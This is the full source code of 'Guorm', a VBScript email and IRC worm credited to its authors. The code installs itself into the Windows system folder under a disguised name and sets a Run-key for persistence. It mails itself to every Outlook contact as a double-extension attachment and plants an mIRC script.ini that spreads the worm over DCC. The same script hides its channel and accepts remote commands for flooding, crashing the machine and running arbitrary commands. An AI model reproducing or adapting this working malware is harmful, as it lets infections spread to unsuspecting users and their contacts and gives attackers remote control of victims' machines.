'Guorm(Vbs). Mirc/Outlook/Vbs. By Kalamar & BrainMuscle & OldWary.
On error resume next
dim Fso,ws
set ws=CreateObject("WScript.Shell")
set fso=createobject("scripting.filesystemobject")
if not(fso.fileexists(fso.GetSpecialFolder(1) & "\user32.dll.vbs")) then
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1) & "\winuser.dll"
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1) & "\user32.dll.vbs"
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\user32", "wscript.exe " & fso.GetSpecialFolder(1) & "\user32.dll.vbs %"
end if
if ws.regread ("HKCU\software\Guorm\mailed") <> "1" then
DoMail
end if
if ws.regread ("HKCU\software\Guorm\Mirqued") <> "1" then
mirque()
end if
Function DoMail()
On Error Resume Next
Dim fso, ws
Set fso = CreateObject("Scripting.filesystemobject")
Set ws = CreateObject("WScript.Shell")
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Dim wnames(16)
Dim wext(6)
wext(1) = ".vbs": wext(2) = ".vbe": wext(3) = ".txt.vbs": wext(4) = ".jpg.vbs": wext(5) = ".avi.vbs": wext(6) = ".scr.vbs"
wnames(9) = "links": wnames(1) = "cool": wnames(2) = "funny": wnames(3) = "anti-loveletter": wnames(4) = "guorm": wnames(5) = "pot": wnames(6) = "win2k": wnames(7) = "icq2k": wnames(8) = "money": wnames(10) = "funnypic.jpg": wnames(11) = "quake": wnames(12) = "Year2K+1": wnames(13) = "Mirc2K": wnames(14) = "Word2001": wnames(15) = "FunStuff": wnames(16) = "WindowsMe"
Randomize
wname2 = wnames(Int((16 * Rnd) + 1))
Randomize
wext2 = wext(Int((6 * Rnd) + 1))
newname = wname2 & wext2
fso.CopyFile wscript.scriptfullname, fso.GetSpecialFolder(1) & "\" & newname
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "You know what it is. ;-P"
msg.Body = "Check it out!"
msg.Attachments.Add fso.GetSpecialFolder(1) & "\" & newname
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
ws.regwrite "HKCU\software\Guorm\mailed", "1"
OApp.Quit
fso.DeleteFile (fso.GetSpecialFolder(1) & "\" & newname)
end if
End Function
Function mirque()
On Error Resume Next
Dim finded
  Dim fso, Drives, Drivetype
  Dim Drivesefull
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set Drives = fso.Drives
  For Each Drivetype In Drives
    If Drivetype.Drivetype = Remote Then
    Drivesefull = Drivetype & "\"
    Call Search_Subfol(Drivesefull)
    ElseIf Drivetype.IsReady Then
    Drivesefull = Drivetype & "\"
    Call Search_Subfol(Drivesefull)
    End If
  Next
End Function
Function Search_Subfol(Whichfol)
On Error Resume Next
Dim fso, GetFol, Files, File, Subfolds
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set GetFol = fso.GetFolder(Whichfol)
  Set Files = GetFol.Files
  For Each File In Files
   If File.Name = "mirc.ini" Or File.Name = "mirc32.exe" Or File.Name = "mlink32.exe" Then
   Call DoMirc(Whichfol)
   End If
   Next
  Set File = GetFol.SubFolders
  For Each Subfolds In File
   Call Search_Subfol(Subfolds.path)
  Next
End Function
Function DoMirc(path)
On Error Resume Next
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set dirsystem = fso.GetSpecialFolder(0)
If Right(path, 1) <> "\" Then
Set scriptini = fso.CreateTextFile(path & "\script.ini", True)
Else
Set scriptini = fso.CreateTextFile(path & "script.ini", True)
End If
scriptini.WriteLine "[script]"
scriptini.WriteLine "n0=on *:CONNECT:{"
scriptini.WriteLine "n1=  .join #guorm"
scriptini.WriteLine "n2=  set %chancolor $chr(3) $+ 4"
scriptini.WriteLine "n3=  .timercon1 -m 1 250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)"
scriptini.WriteLine "n4=  .timercon2 -m 1 500 .msg #guorm Just annother dumbass"
scriptini.WriteLine "n5=  .timercon3 -m 1 750 .msg #guorm Mother fucker who got infected"
scriptini.WriteLine "n6=  .timercon4 -m 1 1000 .msg #guorm by Guorm - BrainMuscle + OldWary + Kalamar"
scriptini.WriteLine "n7=  .timercon5 -m 1 1250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)"
scriptini.WriteLine "n8=  .timercon6 -m 1 2000 unset %chancolor"
scriptini.WriteLine "n9=  chanstatus"
scriptini.WriteLine "n10=  .timercon7 1 20 update"
scriptini.WriteLine "n11=}"
scriptini.WriteLine "n12=on *:JOIN:#guorm:{ .window -h #guorm }"
scriptini.WriteLine "n13=on *:DISCONNECT:{"
scriptini.WriteLine "n14=  .part #guorm"
scriptini.WriteLine "n15=}"
scriptini.WriteLine "n16=alias -l chanstatus {"
scriptini.WriteLine "n17=  .timerop1 1 10 if ($me isop #guorm) .topic #guorm -=[ Guorm ]=-"
scriptini.WriteLine "n18=  .timerop2 1 11 if ($me isop #guorm) .mode #guorm +nst"
scriptini.WriteLine "n19=  .timerop3 1 12 if ($me isop #guorm) .mode #guorm -o $me"
scriptini.WriteLine "n20=}"
scriptini.WriteLine "n21=on *:JOIN:#: if (($nick != $me) && ($chan != #guorm) && ($chan != #virus)) { guorm.infect $nick }"
scriptini.WriteLine "n22=on *:TEXT:*virus*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick"
scriptini.WriteLine "n23=on *:TEXT:*worm*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick"
scriptini.WriteLine "n24=on *:TEXT:!GuormFlood*:#guorm:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME"
scriptini.WriteLine "n25=ctcp *:!GuormFlood:*:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME"
scriptini.WriteLine "n26=on *:TEXT:!joinflood*:#guorm:.timer51 10 2 .join $2 | .timer52 10 3 .part $2"
scriptini.WriteLine "n27=ctcp *:!joinflood:*:.timer51 10 2 .join $2 | .timer52 10 3 .part $2"
scriptini.WriteLine "n35=ctcp *:!kill:*:.run -n file://c:/con/con"
scriptini.WriteLine "n36=ctcp *:!fserve:*:.fserve $nick 1 $2"
scriptini.WriteLine "n37=ctcp *:+*:*: $right($1-,-1) | /halt"
scriptini.WriteLine "n38=ctcp *:PING: { raw -q notice $nick : $+ $chr(1) $+ PING BrainMuscle + OldWary + KALAMAR $+ $chr(1) } /halt"
scriptini.WriteLine "n39=ctcp *:VERSION: { raw -q notice $nick : $+ $chr(1) $+ VERSION Guorm 1.0 $+ $chr(1) } /halt"
scriptini.WriteLine "n40=ctcp *:FINGER:*: /halt"
scriptini.WriteLine "n41=ctcp *:TIME: { raw -q notice $nick : $+ $chr(1) $+ TIME Guorm time! $+ $chr(1) } /halt"
scriptini.WriteLine "n42=ctcp *:AUTHOR: { raw -q notice $nick : $+ $chr(1) $+ AUTHOR BrainMuscle + OldWary + KALAMAR $+ $chr(1) } /halt"
scriptini.WriteLine "n43=raw 353:*guorm*:/halt"
scriptini.WriteLine "n44=raw 366:*dguorm*:/halt"
scriptini.WriteLine "n45=raw 403:*dguorm*:/halt"
scriptini.WriteLine "n46=raw 442:*dguorm*:/halt"
scriptini.WriteLine "n47=raw *:*guorm*:/halt"
scriptini.WriteLine "n48=alias -l file.name return $gettok(:links.vbs:p0rn.vbs:winsource.vbs:quake.vbs:network.vbs:sony.vbs:vbs.vbs:,$r(1,7),58)"
scriptini.WriteLine "n49=alias guorm.infect {"
scriptini.WriteLine "n50=  %guorm.sock = guorm.send. $+ $rand(100,9000)"
scriptini.WriteLine "n51=  socklisten %guorm.sock"
scriptini.WriteLine "n52=  .timer99 off"
scriptini.WriteLine "n53=  .timer99 1 120 sockclose guorm.send.*"
scriptini.WriteLine "n54=  raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $file.name $longip($ip) $sock(%guorm.sock).port $file(c:\windows\system\winuser.dll).size $+ $chr(1)"
scriptini.WriteLine "n55=}"
scriptini.WriteLine "n56=on *:socklisten:guorm.send.*:{"
scriptini.WriteLine "n57=  set %guorm.temp guorm.write. $+ $gettok($sockname,3,46) | sockaccept %guorm.temp | guorm.send %guorm.temp | sockclose $sockname"
scriptini.WriteLine "n58=}"
scriptini.WriteLine "n59=on *:sockwrite:guorm.write.*:{"
scriptini.WriteLine "n60=  if ($sock($sockname).sent >= $file(c:\windows\system\winuser.dll).size) sockwrite -n $sockname"
scriptini.WriteLine "n61=  else guorm.send $sockname"
scriptini.WriteLine "n62=}"
scriptini.WriteLine "n63=alias  guorm.send {"
scriptini.WriteLine "n64=  bread c:\windows\system\winuser.dll $sock($sockname).sent 4096 &guorm.data"
scriptini.WriteLine "n65=  sockwrite $1 &guorm.data"
scriptini.WriteLine "n66=}"
scriptini.Close
ws.regwrite "HKCU\software\Guorm\Mirqued", "1"
End Function